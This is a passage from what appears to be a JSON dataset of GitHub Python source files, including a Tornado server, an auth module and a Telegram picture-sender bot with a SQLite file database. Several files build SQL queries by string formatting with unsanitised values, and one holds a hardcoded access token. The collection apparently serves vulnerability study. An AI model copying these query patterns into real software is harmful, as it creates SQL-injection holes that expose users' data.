define this shit\n    \ndef launch():\n    server_settings = {\"static_path\": os.path.join(os.path.dirname(__file__), \"./static\"), \n    \"template_path\": \"./server/templates\", \n    \"login_url\": \"/login\", \n    \"cookie_secret\": os.urandom(24), \n    \"xsrf_cookies\": True}\n\n    handlers = [ (r'/', IndexController),\n        (r'/report', ReportController),\n        (r'/create', ReportController.NewReportController), \n        (r'/login', LoginController), \n        (r'/logout', LoginController.LogoutController) ]\n    \n    application = tornado.web.Application(handlers, **server_settings)\n    http_server = tornado.httpserver.HTTPServer(application)\n    http_server.listen(options.port)\n    tornado.ioloop.IOLoop.instance().start()",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/bonbondirac/tsunami/blob/ae8375601c0d171a2d6db912c2fbc2880bfecd8f",
        "file_path": "/src/auth.py",
        "source": "'''\nCreated on 2012-8-9\n\n@author: diracfang\n'''\n\nclass User(object):\n    \n    def __init__(self, db, access_token):\n        self.db = db\n        self.access_token = access_token\n    \n    def get_user(self):\n        if not hasattr(self, '_user'):\n            qs = \"select * from account_access where access_token = '%s'\" % self.access_token\n            result = self.db.get(qs)\n            if result:\n                self._user = result\n            else:\n                self._user = None\n        \n        return self._user\n    \n    def get_user_id(self):\n        user = self.get_user()\n        if user:\n            user_id = user.user_id\n        else:\n            user_id = None\n        \n        return user_id\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/bonbondirac/tsunami/blob/ae8375601c0d171a2d6db912c2fbc2880bfecd8f",
        "file_path": "/src/client.py",
        "source": "'''\nCreated on 2012-8-14\n\n@author: diracfang\n'''\nimport requests\n\ndef call_stream_api(url, access_token):\n    headers = {'Cookie': 'access_token=%s' % access_token}\n    r = requests.get(url, headers=headers)\n    for line in r.iter_lines(chunk_size=8):\n        if line:\n            print line\n        else:\n            print 'keep-alive'\n    \n    \nif __name__ == '__main__':\n    access_token = '9920e647907355f3756dad8b1477da4bcc6850fe'\n    url = 'http://test.kan.sohu.com/api/2/sync/stream'\n    call_stream_api(url, access_token)",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Highstaker/Picture-sender-telegram-bot/blob/a611d19d6c4bec77492938148772b0bd19e44ec4",
        "file_path": "/Picture_Sender_Bot.py",
        "source": "#!/usr/bin/python3 -u\n# -*- coding: utf-8 -*-\n\n#check if the version of Python is correct\nfrom python_version_check import check_version\ncheck_version((3, 4, 3))\n\nVERSION_NUMBER = (1, 0, 10)\n\nimport logging\nfrom random import choice\nfrom time import time\nimport requests, json\nfrom threading import Thread\nfrom queue import Queue\n\nfrom traceback_printer import full_traceback\nfrom telegramHigh import TelegramHigh\nfrom textual_data import *\nfrom userparams import UserParams\nfrom language_support import LanguageSupport\nimport utils\nfrom file_db import FileDB\nfrom button_handler import getMainMenu\n\nfrom settings_reader import SettingsReader\nsr = SettingsReader()\n\n\n############\n##PARAMETERS\n############\n\n#How often should a file list of images be updated, in seconds\nFILE_UPDATE_PERIOD = sr.settings_reader(0)\n\n#If true, use dropbox. If false, use local filesystem\nFROM_DROPBOX = bool(sr.settings_reader(2) == \"DB\")\n\n#A minimum and maximum picture sending period a user can set\nMIN_PICTURE_SEND_PERIOD = 60\nMAX_PICTURE_SEND_PERIOD = 86400\n\n#A default send period\nPICTURE_SEND_PERIOD = sr.settings_reader(1)\n\n\nINITIAL_SUBSCRIBER_PARAMS = {\"lang\": \"EN\",  # bot's langauge\n\t\t\t\t\t\t\t \"subscribed\": 0, # has the user subscribed?\n\t\t\t\t\t\t\t \"period\": PICTURE_SEND_PERIOD,\n\t\t\t\t\t\t\t \"last_update_time\" : 0\n\t\t\t\t\t\t\t }\n\n\n################\n###GLOBALS######\n################\n\n\n\n\n\n#############\n##METHODS###\n############\n\n###############\n###CLASSES#####\n###############\n\nclass MainPicSender():\n\t\"\"\"The bot class\"\"\"\n\n\tLAST_UPDATE_ID = None\n\n\t# Dictionary containing handles to picture-sending processes\n\tpic_sender_threads = {}\n\n\tdef __init__(self, token):\n\t\tsuper(MainPicSender, self).__init__()\n\t\tself.bot = TelegramHigh(token)\n\n\t\t# Initialize user parameters database\n\t\tself.userparams = UserParams(\"users\", initial=INITIAL_SUBSCRIBER_PARAMS)\n\n\t\t# Initialize file database\n\t\tself.file_db = FileDB(\"files\")\n\n\t\t#get list of all image files\n\t\tself.updateFileListThread()\n\n\t\t# Initialize List of files\n\t\tself.files = []\n\n\t\tself.bot.start(processingFunction=self.processUpdate, periodicFunction=self.periodicRoutine)\n\n\tdef processUpdate(self, u):\n\t\tbot = self.bot\n\t\tMessage = u.message\n\t\tmessage = Message.text\n\t\tmessage_id = Message.message_id\n\t\tchat_id = Message.chat_id\n\t\tsubs = self.userparams\n\n\t\t# initialize the user's params if they are not present yet\n\t\tsubs.initializeUser(chat_id=chat_id, data=INITIAL_SUBSCRIBER_PARAMS)\n\n\t\t# language support class for convenience\n\t\tLS = LanguageSupport(subs.getEntry(chat_id=chat_id, param=\"lang\"))\n\t\tlS = LS.languageSupport\n\t\tallv = LS.allVariants\n\t\tMMKM = lS(getMainMenu(subs.getEntry(chat_id=chat_id, param=\"subscribed\")))\n\n\t\tif message == \"/start\":\n\t\t\tbot.sendMessage(chat_id=chat_id\n\t\t\t\t,message=lS(START_MESSAGE)\n\t\t\t\t,key_markup=MMKM\n\t\t\t\t)\n\t\telif message == \"/help\" or message == HELP_BUTTON:\n\t\t\tbot.sendMessage(chat_id=chat_id\n\t\t\t\t,message=lS(HELP_MESSAGE).format(str(MIN_PICTURE_SEND_PERIOD),str(MAX_PICTURE_SEND_PERIOD))\n\t\t\t\t,key_markup=MMKM\n\t\t\t\t,markdown=True\n\t\t\t\t)\n\t\telif message == \"/about\" or message == ABOUT_BUTTON:\n\t\t\tbot.sendMessage(chat_id=chat_id\n\t\t\t\t,message=lS(ABOUT_MESSAGE).format(\".\".join([str(i) for i in VERSION_NUMBER]))\n\t\t\t\t,key_markup=MMKM\n\t\t\t\t,markdown=True\n\t\t\t\t)\n\t\telif message == \"/otherbots\" or message == lS(OTHER_BOTS_BUTTON):\n\t\t\tbot.sendMessage(chat_id=chat_id\n\t\t\t\t,message=lS(OTHER_BOTS_MESSAGE)\n\t\t\t\t,key_markup=MMKM\n\t\t\t\t,markdown=True\n\t\t\t\t)\n\t\telif message == \"/period\" or message == lS(SHOW_PERIOD_BUTTON):\n\t\t\tperiod = self.userparams.getEntry(chat_id, \"period\")\n\n\t\t\tbot.sendMessage(chat_id=chat_id,\n\t\t\t\t\tmessage=\"\"\"An image is sent to you every {0} seconds.\"\"\".format(period),\n\t\t\t\t\tkey_markup=MMKM\n\t\t\t\t\t\t\t)\n\t\telif message == \"/subscribe\" or message == SUBSCRIBE_BUTTON:\n\t\t\tperiod = self.userparams.getEntry(chat_id, \"period\")\n\t\t\tif self.userparams.getEntry(chat_id, \"subscribed\") == 0:\n\t\t\t\tself.userparams.setEntry(chat_id, \"subscribed\", 1)\n\t\t\t\tself.userparams.setEntry(chat_id, \"last_update_time\", time())\n\t\t\t\tMMKM = getMainMenu(subscribed=True)\n\n\t\t\t\tbot.sendMessage(chat_id=chat_id,\n\t\t\t\t\tmessage=\"\"\"You're subscribed now! \nAn image will be sent to you every {0} seconds. \nTo cancel subscription enter /unsubscribe. \nTo change the period of picture sending type a number.\"\"\".format(period),\n\t\t\t\t\tkey_markup=MMKM\n\t\t\t\t\t)\n\t\t\telse:\n\t\t\t\tbot.sendMessage(chat_id=chat_id,\n\t\t\t\t\tmessage=\"\"\"You have already subscribed!\nTo cancel subscription enter /unsubscribe.\nTo change the period of picture sending type a number.\nYour current period is {0} seconds.\"\"\".format(period),\n\t\t\t\t\tkey_markup=MMKM\n\t\t\t\t\t)\n\t\telif message == \"/unsubscribe\" or message == UNSUBSCRIBE_BUTTON:\n\t\t\tif self.userparams.getEntry(chat_id, \"subscribed\") == 1:\n\t\t\t\tself.userparams.setEntry(chat_id, \"subscribed\", 0)\n\t\t\t\tMMKM = getMainMenu(subscribed=False)\n\n\t\t\t\tbot.sendMessage(chat_id=chat_id,\n\t\t\t\t\tmessage=\"You have unsubscribed. To subscribe again type /subscribe\",\n\t\t\t\t\tkey_markup=MMKM\n\t\t\t\t\t)\n\t\t\telse:\n\t\t\t\tbot.sendMessage(chat_id=chat_id,\n\t\t\t\t\tmessage=\"You haven't subscribed yet! To subscribe type /subscribe\",\n\t\t\t\t\tkey_markup=MMKM\n\t\t\t\t\t)\n\t\telif message == \"/gimmepic\" or message == GIMMEPIC_BUTTON:\n\t\t\tself.startRandomPicThread(chat_id, MMKM)\n\t\telse:\n\t\t\t#any other message\n\t\t\ttry:\n\t\t\t\tnew_period = int(message)\n\n\t\t\t\tif self.userparams.getEntry(chat_id,\"subscribed\") == 0:\n\t\t\t\t\tbot.sendMessage(chat_id=chat_id,\n\t\t\t\t\t\t\t\t\tmessage=\"You're not subscribed yet! /subscribe first!\"\n\t\t\t\t\t\t\t\t\t,key_markup=MMKM\n\t\t\t\t\t\t\t\t\t)\n\t\t\t\telse:\n\t\t\t\t\t#If a period is too small\n\t\t\t\t\tif new_period < MIN_PICTURE_SEND_PERIOD:\n\t\t\t\t\t\tself.userparams.setEntry(chat_id, \"period\", MIN_PICTURE_SEND_PERIOD)\n\t\t\t\t\t\tbot.sendMessage(chat_id=chat_id,\n\t\t\t\t\t\t\tmessage=\"The minimum possible period is {0}.\\nSetting period to {0}.\".format(str(MIN_PICTURE_SEND_PERIOD))\n\t\t\t\t\t\t\t,key_markup=MMKM\n\t\t\t\t\t\t\t)\n\n\n\t\t\t\t\t#If a period is too big\n\t\t\t\t\telif new_period > MAX_PICTURE_SEND_PERIOD:\n\t\t\t\t\t\tself.userparams.setEntry(chat_id, \"period\", MAX_PICTURE_SEND_PERIOD)\n\t\t\t\t\t\tbot.sendMessage(chat_id=chat_id,\n\t\t\t\t\t\t\tmessage=\"The maximum possible period is {0}.\\nSetting period to {0}.\".format(str(MAX_PICTURE_SEND_PERIOD))\n\t\t\t\t\t\t\t,key_markup=MMKM\n\t\t\t\t\t\t\t)\n\n\t\t\t\t\t#If a period length is fine - accept\n\t\t\t\t\telse:\n\t\t\t\t\t\tself.userparams.setEntry(chat_id, \"period\", new_period)\n\t\t\t\t\t\tbot.sendMessage(chat_id=chat_id,\n\t\t\t\t\t\t\tmessage=\"Setting period to \" + str(new_period) + \".\"\n\t\t\t\t\t\t\t,key_markup=MMKM\n\t\t\t\t\t\t\t)\n\n\t\t\t\t\t# Reset timer\n\t\t\t\t\tself.userparams.setEntry(chat_id, \"last_update_time\", int(time()))\n\n\t\t\t#user has sent a bullsh*t command\n\t\t\texcept ValueError:\n\t\t\t\tbot.sendMessage(chat_id=chat_id,\n\t\t\t\t\tmessage=\"Unknown command!\"\n\t\t\t\t\t,key_markup=MMKM\n\t\t\t\t\t)\n\n\tdef periodicRoutine(self):\n\t\t'''\n\t\tA function that runs every second or so\n\t\t:return:\n\t\t'''\n\t\t# Update list of picture paths\n\t\tif not hasattr(self, 'update_filelist_thread_queue'):\n\t\t\t# Init queue\n\t\t\tself.update_filelist_thread_queue = Queue()\n\t\twhile not self.update_filelist_thread_queue.empty():\n\t\t\t# update params from thread\n\t\t\tq = self.update_filelist_thread_queue.get()\n\t\t\tself.last_filelist_update_time = q[0]\n\n\t\tself.updateFileListThread()\n\n\t\t# TODO:Clean up finished pic sender threads\n\n\t\t# subscription handling\n\t\tfor user in self.userparams.getAllEntries(fields=[\"subscribed\",\"period\",\"last_update_time\",\"chat_id\"]):\n\t\t\tif user[0] == 1:\n\t\t\t\t# user is subscribed\n\t\t\t\tcur_time = time()\n\t\t\t\tif (cur_time - user[2]) > user[1]:\n\t\t\t\t\t# The time has come for this user (heh, sounds intimidating)\n\t\t\t\t\tself.startRandomPicThread(user[3], MMKM=getMainMenu(True))\n\t\t\t\t\t# Reset the timer\n\t\t\t\t\tself.userparams.setEntry(user[3],\"last_update_time\", cur_time)\n\n\n\n\n\tdef updateFileListThread(self):\n\t\t'''\n\t\tStarts the file list grabbing thread\n\t\t:return:\n\t\t'''\n\t\tif not hasattr(self, 'last_filelist_update_time') or (time()-self.last_filelist_update_time) >  FILE_UPDATE_PERIOD:\n\t\t\t# Run updater is it's time already\n\t\t\tif not (hasattr(self, 'filelist_updater_thread') and self.filelist_updater_thread.isAlive()):\n\t\t\t\t# Run the thread if it is not working yet (never existed or already terminated, respectively).\n\t\t\t\tself.filelist_updater_thread = Thread(target=self.updateFileList)\n\t\t\t\tself.filelist_updater_thread.start()\n\t\t\telse:\n\t\t\t\tpass\n\t\t\t\tprint(\"updater already running!\")#debug\n\n\tdef fileToDB(self, filepath, mod_time):\n\t\t\"\"\"\n\t\tAdds or updates a file in the database\n\t\t:param mod_time: When the real file was modified, in Unix time\n\t\t:param filepath: a full path to a file to process\n\t\t:return:\n\t\t\"\"\"\n\t\tfile_db = self.file_db\n\n\t\tif path.splitext(filepath)[1].replace(\".\", \"\").lower() != \"txt\":\n\t\t\t# it's an image\n\t\t\tif not file_db.fileExists(filepath):\n\t\t\t\tfile_db.addFile(filepath, mod_time=mod_time)\n\t\t\telif mod_time > file_db.getModTime(filepath):\n\t\t\t\t#file has updated, invalidate the cached telegram file ID and update the mod time in DB\n\t\t\t\tfile_db.invalidateCached(filepath)\n\t\t\t\tfile_db.updateModTime(filepath, mod_time)\n\t\telse:\n\t\t\t#TODO: read metadata from dropbox\n\t\t\t# it's a text file\n\t\t\tif path.basename(filepath) == METADATA_FILENAME:\n\t\t\t\t#it's a metadata file\n\t\t\t\tdef getMetadata():\n\t\t\t\t\t# Update the obsolete metadata\n\t\t\t\t\tmetadata = \"\"\n\t\t\t\t\ttry:\n\t\t\t\t\t\tif not FROM_DROPBOX:\n\t\t\t\t\t\t\twith open(filepath, 'r') as f:\n\t\t\t\t\t\t\t\tmetadata = f.read()\n\t\t\t\t\t\telse:\n\t\t\t\t\t\t\tmetadata = self.getDropboxFile(filepath).decode()\n\t\t\t\t\texcept Exception as e:\n\t\t\t\t\t\tlogging.error(\"Could not read metafile!\", full_traceback())\n\t\t\t\t\treturn metadata\n\t\t\t\tif not file_db.fileExists(filepath):\n\t\t\t\t\t# add a folder entry with metadata. Path in DB will be the full path to metadata text file\n\t\t\t\t\tfile_db.addMetafile(filepath, getMetadata(), mod_time)\n\t\t\t\telif mod_time > file_db.getModTime(filepath):\n\t\t\t\t\tfile_db.updateMetadata(filepath, getMetadata(), mod_time)\n\n\n\tdef checkFilesForDeletion(self, files):\n\t\t\"\"\"\n\t\tChecks the database for the presence of files that don't exist anymore.\n\t\t:param files: list of files received from an actual filesystem scan\n\t\t:return:\n\t\t\"\"\"\n\t\tfile_db = self.file_db\n\n\t\t# Get a list of paths in database\n\t\tDB_files = file_db.getFileList()\n\n\t\tfor f in DB_files:\n\t\t\tif not f in files:\n\t\t\t\tfile_db.deleteFile(f)\n\n\n\tdef updateFileList(self):\n\t\t'''\n\t\tTHREAD\n\t\tReads the files in the directory and updates the file list\n\t\t'''\n\n\t\tif not FROM_DROPBOX:\n\t\t\t# list of filepaths\n\t\t\tfiles = utils.FolderSearch.getFilepathsInclSubfolders(PIC_FOLDER, allowed_extensions=[\"txt\",\"png\",\"jpg\",\"jpeg\"])\n\n\t\t\t# When the file was modified, in Unix time\n\t\t\t# list of tuples (filepath, mod_time)\n\t\t\tfiles_and_mods = list(zip(files,\n\t\t\t\t[utils.FileUtils.getModificationTimeUnix(f) for f in files]\n\t\t\t))\n\t\telse:\n\t\t\tfiles_and_mods = utils.DropboxFolderSearch.getFilepathsInclSubfoldersDropboxPublic(DROPBOX_FOLDER_LINK,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t   DROPBOX_APP_KEY,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t   DROPBOX_SECRET_KEY,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t   unixify_mod_time=True\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t   )\n\t\t\tfiles = [i[0] for i in files_and_mods]\n\n\t\t# Add or update files to DB\n\t\tfor i in files_and_mods:\n\t\t\tself.fileToDB(i[0], i[1])\n\n\t\t# Delete files that no longer exist from DB\n\t\tself.checkFilesForDeletion(files)\n\n\t\t# Update the time\n\t\tlast_filelist_update_time=time()\n\n\t\t# Put results to queue\n\t\tself.update_filelist_thread_queue.put((last_filelist_update_time,))\n\n\t@staticmethod\n\tdef getDropboxFile(filepath):\n\t\t\"\"\"\n\t\tGets the data from a file in Dropbox\n\t\t:param filepath: path to a file in Dropbox\n\t\t:return:  bytestring containing data from file\n\t\t\"\"\"\n\t\tdata = None\n\t\t# First, get metadata of a file. It contains a direct link to it!\n\t\treq=requests.post('https://api.dropbox.com/1/metadata/link',\n\t\t\t\t\t\t  data=dict( link=DROPBOX_FOLDER_LINK,\n\t\t\t\t\t\t\t\t\t client_id=DROPBOX_APP_KEY,\n\t\t\t\t\t\t\t\t\t client_secret=DROPBOX_SECRET_KEY,\n\t\t\t\t\t\t\t\t\t path=filepath), timeout=5 )\n\t\tif req.ok:\n\t\t\t# If metadata got grabbed, extract a link to a file and make a downloadable version of it\n\t\t\treq= json.loads(req.content.decode())['link'].split(\"?\")[0] + \"?dl=1\"\n\t\t\t# Now let's get the file contents\n\t\t\ttry:\n\t\t\t\treq=requests.get(req, timeout=5)\n\t\t\t\tif req.ok:\n\t\t\t\t\tdata = req.content\n\t\t\texcept:\n\t\t\t\tdata = None\n\t\telse:\n\t\t\t#handle absence of file (maybe got deleted?)\n\t\t\tdata = None\n\n\t\treturn data\n\n\tdef startRandomPicThread(self, chat_id, MMKM):\n\t\t\"\"\"\n\t\tStarts a random pic sending thread\n\t\t:param chat_id: a user to send pic to\n\t\t:return:\n\t\t\"\"\"\n\t\tdef startThread(chat_id):\n\t\t\tt = Thread(target=self.sendRandomPic, args=(chat_id, MMKM,))\n\t\t\tself.pic_sender_threads[chat_id] = t\n\t\t\tt.start()\n\n\t\ttry:\n\t\t\tif not self.pic_sender_threads[chat_id].isAlive():\n\t\t\t\t# Start the thread if it is dead\n\t\t\t\tstartThread(chat_id)\n\t\t\telse:\n\t\t\t\tself.bot.sendMessage(chat_id=chat_id,\n\t\t\t\t\tmessage=\"I'm still sending you a pic. Please wait!\"\n\t\t\t\t\t)\n\t\texcept KeyError:\n\t\t\t# If there was never a thread for this user, start it.\n\t\t\tstartThread(chat_id)\n\n\tdef sendRandomPic(self, chat_id, MMKM):\n\t\t\"\"\"\n\t\tTHREAD\n\t\tSends a random picture from a file list to a user.\n\t\t:param chat_id:\n\t\t:return:\n\t\t\"\"\"\n\t\tdef getLocalFile(filepath):\n\t\t\t\"\"\"\n\t\t\tGets the data from a local file\n\t\t\t:param filepath: path to a local file to get data\n\t\t\t:return: bytestring containing data from file\n\t\t\t\"\"\"\n\t\t\twith open(filepath, 'rb') as f:\n\t\t\t\tdata = f.read()\n\n\t\t\treturn data\n\n\n\t\tsent_message, cached_ID, data, random_file, caption = None, None, None, None, \"\"\n\t\twhile True:\n\t\t\ttry:\n\t\t\t\t# get list of files\n\t\t\t\tfiles = self.file_db.getFileListPics()\n\t\t\t\t# pick a file at random\n\t\t\t\trandom_file = choice(files)\n\t\t\texcept IndexError:\n\t\t\t\t# DB is empty. Exit the function\n\t\t\t\tself.bot.sendMessage(chat_id=chat_id,\n\t\t\t\t\t\t\t\t\tmessage=\"Sorry, no pictures were found!\",\n\t\t\t\t\t\t\t\t\tkey_markup=MMKM\n\t\t\t\t\t\t\t\t\t)\n\t\t\t\treturn\n\n\t\t\t# get the ID of a file in Telegram, if present\n\t\t\tcached_ID = self.file_db.getFileCacheID(random_file)\n\t\t\t# Get the metadata to send with a pic\n\t\t\tcaption = self.file_db.getCaptionPic(random_file)\n\n\t\t\twhile True:\n\t\t\t\tif not cached_ID:\n\t\t\t\t\t# if file is not cached in Telegram\n\t\t\t\t\ttry:\n\t\t\t\t\t\t# We will send a bytestring\n\t\t\t\t\t\tif not FROM_DROPBOX:\n\t\t\t\t\t\t\tdata = getLocalFile(random_file)\n\t\t\t\t\t\t\tprint(\"Not cached, getting a local file!\")#debug\n\t\t\t\t\t\telse:\n\t\t\t\t\t\t\t# data = None\n\t\t\t\t\t\t\tprint(\"Not cached, getting a file from Dropbox!\")#debug\n\t\t\t\t\t\t\tdata = self.getDropboxFile(random_file)\n\n\t\t\t\t\texcept Exception as e:\n\t\t\t\t\t\tlogging.error(\"Error reading file!\" + full_traceback())\n\t\t\t\t\t\t#File still exists in the DB, but is gone for real. Try another file.\n\t\t\t\t\t\tbreak\n\t\t\t\telse:\n\t\t\t\t\t# file is cached, use resending of cache\n\t\t\t\t\tdata = cached_ID\n\t\t\t\t\tprint(\"Cached, sending cached file!\")\n\n\t\t\t\ttry:\n\t\t\t\t\t# Send the pic and get the message object to store the file ID\n\t\t\t\t\tsent_message = self.bot.sendPic(chat_id=chat_id,\n\t\t\t\t\t\t\t\t\tpic=data,\n\t\t\t\t\t\t\t\t\tcaption=caption,\n\t\t\t\t\t\t\t\t\tkey_markup=MMKM\n\t\t\t\t\t\t\t\t\t)\n\t\t\t\t\t# print(\"sent_message\", sent_message)#debug\n\t\t\t\t\tbreak\n\t\t\t\texcept Exception as e:\n\t\t\t\t\tif \"Network error\" in str(e):\n\t\t\t\t\t\tprint(\"Cache damaged! Trying to send image by uploading!\")\n\t\t\t\t\t\t# cached ID is invalid. Remove it and upload the image.\n\t\t\t\t\t\tself.file_db.invalidateCached(random_file)\n\t\t\t\t\t\tcached_ID = None\n\n\t\t\tif not data:\n\t\t\t\t# If there is no data, the file could not be read. Come back to the beginning of the loop\n\t\t\t\t# and try picking a different random file\n\t\t\t\tcontinue\n\t\t\telse:\n\t\t\t\t# Data exists and was sent, exit loop\n\t\t\t\tbreak\n\n\n\t\tif sent_message == None:\n\t\t\tself.bot.sendMessage(chat_id=chat_id,\n\t\t\t\t\t\t\t\tmessage=\"Error sending image! Please, try again!\",\n\t\t\t\t\t\t\t\tkey_markup=MMKM\n\t\t\t\t\t\t\t)\n\t\telif not cached_ID:\n\t\t\tfile_id = self.bot.getFileID_byMesssageObject(sent_message)\n\t\t\tself.file_db.updateCacheID(random_file, file_id)\n\n\ndef main():\n\tMainPicSender(BOT_TOKEN)\n\nif __name__ == '__main__':\n\tmain()",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Highstaker/Picture-sender-telegram-bot/blob/a611d19d6c4bec77492938148772b0bd19e44ec4",
        "file_path": "/file_db.py",
        "source": "#!/usr/bin/python3 -u\n# -*- coding: utf-8 -*-\nimport os\nimport sqlite3\n\nimport utils\nfrom os import path\nfrom utils import SQLiteUtils\ngetSQLiteType = SQLiteUtils.getSQLiteType\nfrom threading import Lock\n\nfrom textual_data import DATABASES_FOLDER_NAME, METADATA_FILENAME\n\n# The folder containing the script itself\nSCRIPT_FOLDER = path.dirname(path.realpath(__file__))\n\nTABLE_NAME = \"files\"\n\n\n# noinspection SqlNoDataSourceInspection,SqlDialectInspection\nclass FileDB(object):\n\tdef __init__(self, filename):\n\t\t\"\"\"\n\n\t\t:param filename: name of database file without extension\n\t\t:return:\n\t\t\"\"\"\n\t\tsuper(FileDB, self).__init__()\n\t\tos.makedirs(path.join(SCRIPT_FOLDER, DATABASES_FOLDER_NAME),exist_ok=True)\n\t\tself.filename = path.join(SCRIPT_FOLDER, DATABASES_FOLDER_NAME, filename + \".db\")\n\n\t\t# A lock for thread safety\n\t\tself.lock = Lock()\n\n\t\t# Type 0 - file, 1 - metadata for folder\n\t\tinitial={\"type\":0, 'meta':'str', 'path':'str', 'mod_time':0, 'file_id':\"str\"}\n\n\t\t# if database already exists, append new columns to it, if any\n\t\tif initial:\n\t\t\tif path.isfile(self.filename):\n\t\t\t\tfor i in initial.keys():\n\t\t\t\t\tself._addColumn(i, initial[i])\n\t\t\telse:\n\t\t\t\t#database doesn't exist, create it\n\t\t\t\tself.createTable(initial)\n\n\tdef getDBFilename(self):\n\t\t\"\"\"\n\t\tReturns the file path to database file\n\t\t:return:\n\t\t\"\"\"\n\t\treturn self.filename\n\n\tdef createTable(self, data):\n\t\t\"\"\"\n\t\tCreates the table with columns specified in `data`\n\t\t:param data: a dictionary with parametes to initialize the table.\n\t\tKeys become column names, values have their type read and used as column type\n\t\t:return:\n\t\t\"\"\"\n\t\tcommand = \"CREATE TABLE {0}(ID INTEGER PRIMARY KEY \".format(TABLE_NAME)\n\n\t\tfor i in data:\n\t\t\tcommand += \",\" + i + \" \"\n\t\t\tcommand += getSQLiteType(data[i])\n\n\t\tcommand += \");\"\n\n\t\tself._run_command(command)\n\n\tdef _addColumn(self, column, init_data):\n\t\t\"\"\"\n\t\tAdds a column to the table, if it doesn't exist\n\t\t:param column: name of the new column\n\t\t:param init_data: data to be put in that column. Used to determine the type\n\t\t:return:\n\t\t\"\"\"\n\t\tcommand = \"ALTER TABLE \" + TABLE_NAME + \" ADD COLUMN \" + str(column) + \" \" + getSQLiteType(init_data)\n\t\ttry:\n\t\t\tself._run_command(command)\n\t\texcept sqlite3.OperationalError:\n\t\t\tprint(\"Column \" + str(column) + \" already exists!\")\n\n\tdef _run_command(self, command):\n\t\t\"\"\"\n\t\tRuns a given command and returns the output.\n\t\t:param command:\n\t\t:return:\n\t\t\"\"\"\n\t\twith self.lock:\n\t\t\tconn = sqlite3.connect(self.filename)\n\t\t\tcursor = conn.execute(command)\n\t\t\tdata =[i for i in cursor]\n\t\t\tconn.commit()\n\t\t\tconn.close()\n\n\t\treturn data\n\n\tdef getIDbyPath(self, pth):\n\t\t\"\"\"\n\t\tReturns the DB ID by a path field\n\t\t:param pth:\n\t\t:return:\n\t\t\"\"\"\n\n\t\tcommand = \"SELECT ID FROM {0} WHERE path='{1}';\".format(TABLE_NAME,pth)\n\t\tdata = self._run_command(command)\n\n\t\ttry:\n\t\t\tresult = data[0][0]\n\t\texcept IndexError:\n\t\t\tresult = None\n\n\t\treturn result\n\n\tdef fileExists(self, pth):\n\t\t\"\"\"\n\t\tReturns True if a file with a given path is in DB.\n\t\t:param pth:\n\t\t:return: bool\n\t\t\"\"\"\n\t\treturn bool(self.getIDbyPath(pth))\n\n\tdef addFile(self, pth, mod_time=None):\n\t\t\"\"\"\n\t\tAdds a file with a given path. Doesn't, if the file with given path already exists in DB.\n\t\t:param pth:\n\t\t:return:\n\t\t\"\"\"\n\t\tif not self.fileExists(pth):\n\t\t\tif not mod_time:\n\t\t\t\tmod_time = utils.FileUtils.getModificationTimeUnix(pth)\n\n\t\t\tcommand = \"INSERT INTO {0} (type, path, mod_time) VALUES (0, '{1}', {2});\".format(TABLE_NAME, pth, mod_time)\n\n\t\t\tself._run_command(command)\n\t\telse:\n\t\t\tprint(\"addFile: File already exists!\")#debug\n\n\tdef getModTime(self, pth):\n\t\t\"\"\"\n\t\tGets the modification time of a file in DB\n\t\t:param pth:\n\t\t:return: integer or None\n\t\t\"\"\"\n\t\tif self.fileExists(pth):\n\t\t\tcommand = \"SELECT mod_time FROM {0} WHERE path='{1}';\".format(TABLE_NAME, pth)\n\t\t\tresult = self._run_command(command)\n\t\t\ttry:\n\t\t\t\tresult = result[0][0]\n\t\t\texcept IndexError:\n\t\t\t\tresult = None\n\t\telse:\n\t\t\tprint(\"getModTime: File doesn't exist\")\n\t\t\tresult = None\n\n\t\treturn result\n\n\tdef updateModTime(self, pth, mod_time):\n\t\t\"\"\"\n\t\tUpdates the modification time of a file in the DB\n\t\t:param pth: file in DB to assign this to\n\t\t:param mod_time: new modification time to assign\n\t\t:return:\n\t\t\"\"\"\n\t\tif self.fileExists(pth):\n\t\t\tcommand = \"UPDATE {0} SET mod_time={1} WHERE path='{2}';\".format(TABLE_NAME, mod_time, pth)\n\t\t\tself._run_command(command)\n\t\telse:\n\t\t\tprint(\"updateModTime: file doesn't exist!\")\n\n\tdef addMetafile(self, pth, metadata, mod_time):\n\t\t\"\"\"\n\t\tAdds metadata entry\n\t\t:param pth: path to a metadata file\n\t\t:param metadata:\n\t\t:return:\n\t\t\"\"\"\n\n\t\tif not self.fileExists(pth):\n\t\t\tcommand = \"INSERT INTO {0} (type, path, meta, mod_time) VALUES (1, '{1}', '{2}', '{3}');\".format(TABLE_NAME,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tpth,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tutils.SQLiteUtils.escapeText(metadata),\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tmod_time\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t)\n\t\t\tself._run_command(command)\n\t\telse:\n\t\t\tprint(\"addMetafile: Meta File already exists!\")#debug\n\n\tdef updateMetadata(self, pth, metadata, mod_time):\n\t\t\"\"\"\n\t\tUpdates metadata for a folder\n\t\t:param pth: path to a metadata file\n\t\t:param metadata: new metadata\n\t\t:return:\n\t\t\"\"\"\n\t\tif self.fileExists(pth):\n\t\t\tcommand = \"UPDATE {0} SET meta='{1}', mod_time='{3}' WHERE path='{2}';\".format(TABLE_NAME,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tutils.SQLiteUtils.escapeText(metadata),\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tpth,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tmod_time)\n\t\t\tself._run_command(command)\n\t\telse:\n\t\t\tprint(\"updateMetadata: file doesn't exist!\")#debug\n\n\tdef getMetadata(self, pth):\n\t\t\"\"\"\n\t\tGets metadata for a file in DB\n\t\t:param pth: path to a metadata 